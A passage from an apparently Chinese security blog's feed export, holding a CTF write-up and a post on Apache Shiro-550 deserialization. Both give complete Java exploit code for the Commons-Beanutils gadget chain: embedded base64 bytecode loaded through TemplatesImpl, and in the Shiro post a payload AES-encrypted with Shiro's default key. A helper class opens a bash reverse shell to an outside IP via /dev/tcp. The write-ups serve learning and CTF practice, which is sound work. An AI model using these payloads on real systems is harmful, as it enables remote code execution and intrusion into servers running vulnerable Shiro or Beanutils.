    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>深育杯Weblog复现</title>
    <link href="http://example.com/2021/11/18/%E6%B7%B1%E8%82%B2%E6%9D%AFWeblog%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2021/11/18/%E6%B7%B1%E8%82%B2%E6%9D%AFWeblog%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-11-17T17:42:48.000Z</published>
    <updated>2021-11-17T17:43:20.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深育杯-WebLog-复现"><a href="#深育杯-WebLog-复现" class="headerlink" title="深育杯 WebLog 复现"></a>深育杯 WebLog 复现</h1><p>题目的前面部分是利用文件下载功能下载到网站的jar包，由于环境没有了这里直接从jar开始做起。</p><p>查看路由发现了一个反序列化的入口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118004529001.png" alt="image-20211118004529001"></p><p>在jar包中的pom.xml中发现了<code>commoms-beanutils</code>依赖</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118004420164.png" alt="image-20211118004420164"></p><blockquote><p>比赛的时候虽然想的是使用反序列化，但是当时只学到了CC链，所以没有想到使用CB链</p></blockquote><p>直接根据commons-beautils编写POC</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CB1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9Mb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvVGVtcGxhdGVzSW1wbFRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4&quot;</span> +<br>                <span class="hljs-string">&quot;Y2VwdGlvbnMHACoBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E&quot;</span> +<br>                <span class="hljs-string">&quot;T007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtM&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25I&quot;</span> +<br>                <span class="hljs-string">&quot;YW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k&quot;</span> +<br>                <span class="hljs-string">&quot;dG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZh&quot;</span> +<br>                <span class="hljs-string">&quot;L2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAApTb3VyY2VGaWxlAQAWVGVtcGxhdGVzSW1wbFRlc3QuamF2YQEAHW9yZy9sY2RtMTIz&quot;</span> +<br>                <span class="hljs-string">&quot;L1RlbXBsYXRlc0ltcGxUZXN0DAAfACAHACwMAC0ALgEAEGdub21lLWNhbGN1bGF0b3IMAC8AMAEA&quot;</span> +<br>                <span class="hljs-string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +<br>                <span class="hljs-string">&quot;VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNs&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +<br>                <span class="hljs-string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgACQACAAoAAAA/AAAAAwAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAGxAAAAAgALAAAABgABAAAADwAMAAAAIAADAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABEAEgAC&quot;</span> +<br>                <span class="hljs-string">&quot;ABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwATAAAABAABABQACQAaABsA&quot;</span> +<br>                <span class="hljs-string">&quot;AgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFwAIABgADAAAAAwAAQAAAAkA&quot;</span> +<br>                <span class="hljs-string">&quot;HAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4AAQSBbYABlexAAAAAgAL&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAEAAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Comparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;2&quot;</span>);<br><br>        setFieldValue(comparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        <span class="hljs-comment">/*ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());</span><br><span class="hljs-comment">        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">        objectInputStream.readObject();</span><br><span class="hljs-comment">        objectOutputStream.close();*/</span><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118011927753.png" alt="image-20211118011927753"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118011843981.png" alt="image-20211118011843981"></p><p>经过测试这里直接执行了命令，尝试直接反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImplTest</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        String[] cmd = &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.148.176/9999 0&gt;&amp;1&quot;</span>&#125;;<br>        Runtime.getRuntime().exec(cmd);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013956274.png" alt="image-20211118013956274"></p><p>获取字节码的base64编码然后放入POC中，运行发送即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013854535.png" alt="image-20211118013854535"></p><p>成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118013835543.png" alt="image-20211118013835543"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题目本身并不难，但是由于对Java反序列化的学习不到位，所以没有做出来，确实太菜了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深育杯-WebLog-复现&quot;&gt;&lt;a href=&quot;#深育杯-WebLog-复现&quot; class=&quot;headerlink&quot; title=&quot;深育杯 WebLog 复现&quot;&gt;&lt;/a&gt;深育杯 WebLog 复现&lt;/h1&gt;&lt;p&gt;题目的前面部分是利用文件下载功能下载到网站的jar包</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-550反序列化(二)</title>
    <link href="http://example.com/2021/11/18/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/"/>
    <id>http://example.com/2021/11/18/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</id>
    <published>2021-11-17T16:14:35.000Z</published>
    <updated>2021-11-17T16:14:57.559Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Shiro-550-反序列化链（二）"><a href="#Shiro-550-反序列化链（二）" class="headerlink" title="Shiro-550 反序列化链（二）"></a>Shiro-550 反序列化链（二）</h2><p>在实际情况下 Shiro 可能没有安装 commons-collections 这个时候就不能利用CC链了，但是这里可以利用Commons-Beanutils链吗?</p><p>在 P神的 shirodemo 中，把pom.xml中的commons-collections删除，重新使用Maven加载时，发现依赖库中依然存在 Commons-Beanutils，那么shiro就是依赖Commons-Beanutils的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117230122473.png" alt="image-20211117230122473"></p><p>那么这里可以直接使用 CB1链子吗？</p><p>但是这里显示报错了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117232538623.png" alt="image-20211117232538623"></p><p>根据报错判断和反序列化的<code>serialVersionUID</code>有关系，应该是两边的Commons-Beanutils版本不一样导致的。修改本地版本重新测试</p><p>修改之后报错改变了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117233152969.png" alt="image-20211117233152969"></p><blockquote><p>不能加载 org.apache.commons.collections.comparators.ComparableComparator 类</p></blockquote><p>在Commons-Beanutils中只依赖了一部分commons-collections 但是在shiro正常使用时不依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><p>所以这里就需要找到代替的类</p><h2 id="无依赖shiro反序列化链"><a href="#无依赖shiro反序列化链" class="headerlink" title="无依赖shiro反序列化链"></a>无依赖shiro反序列化链</h2><p>先寻找使用<code>org.apache.commons.collections.comparators.ComparableComparator</code>的地方</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117234506871.png" alt="image-20211117234506871"></p><p>在<code>BeanComparator</code>的构造函数有两个地方使用了，但是只需要在构造函数中传入<code>compatator</code>参数就可以绕过了。但是我们需要重新找到一个类来替换<code>ComparableComparator</code>，并且需要满足的条件</p><ul><li>实现了<code>java.util.Comparator</code>接口</li><li>实现了反序列化接口</li><li>java shiro 或 commons-beanutils 自带的，并且兼容性强</li></ul><p>这里找到了一个完美的代替类<code>CaseInsensitiveComparator</code>，它是String类中的一个内部私有类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117235513616.png" alt="image-20211117235513616"></p><p>我们通过 <code>String.CASE_INSENSITIVE_ORDER</code> 即可拿到上下文中的 <code>CaseInsensitiveComparator</code> 对 象，用它来实例化 <code>BeanComparator</code></p><p>所以这里重新修改链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> java.lang.String;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroV2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9Mb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvVGVtcGxhdGVzSW1wbFRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4&quot;</span> +<br>                <span class="hljs-string">&quot;Y2VwdGlvbnMHACoBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9E&quot;</span> +<br>                <span class="hljs-string">&quot;T007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtM&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25I&quot;</span> +<br>                <span class="hljs-string">&quot;YW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9k&quot;</span> +<br>                <span class="hljs-string">&quot;dG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZh&quot;</span> +<br>                <span class="hljs-string">&quot;L2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsHACsBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAApTb3VyY2VGaWxlAQAWVGVtcGxhdGVzSW1wbFRlc3QuamF2YQEAHW9yZy9sY2RtMTIz&quot;</span> +<br>                <span class="hljs-string">&quot;L1RlbXBsYXRlc0ltcGxUZXN0DAAfACAHACwMAC0ALgEAEGdub21lLWNhbGN1bGF0b3IMAC8AMAEA&quot;</span> +<br>                <span class="hljs-string">&quot;QGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0&quot;</span> +<br>                <span class="hljs-string">&quot;VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNs&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApn&quot;</span> +<br>                <span class="hljs-string">&quot;ZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0&quot;</span> +<br>                <span class="hljs-string">&quot;cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgACQACAAoAAAA/AAAAAwAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAGxAAAAAgALAAAABgABAAAADwAMAAAAIAADAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABEAEgAC&quot;</span> +<br>                <span class="hljs-string">&quot;ABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwATAAAABAABABQACQAaABsA&quot;</span> +<br>                <span class="hljs-string">&quot;AgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFwAIABgADAAAAAwAAQAAAAkA&quot;</span> +<br>                <span class="hljs-string">&quot;HAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4AAQSBbYABlexAAAAAgAL&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAEAAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl template =<span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(template,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(template,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br><br>        <span class="hljs-keyword">final</span> BeanComparator comp = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>,String.CASE_INSENSITIVE_ORDER);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comp);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comp,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]&#123;template, template&#125;);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource byteSource = aes.encrypt(payload,key);<br>        System.out.println(byteSource.toString());<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行了命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000823383.png" alt="image-20211118000823383"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211118000557586.png" alt="image-20211118000557586"></p><p>虽然感觉变化的不多，但是这里利用的东西却不少，发现还有一些其他的代替方法</p><p><img 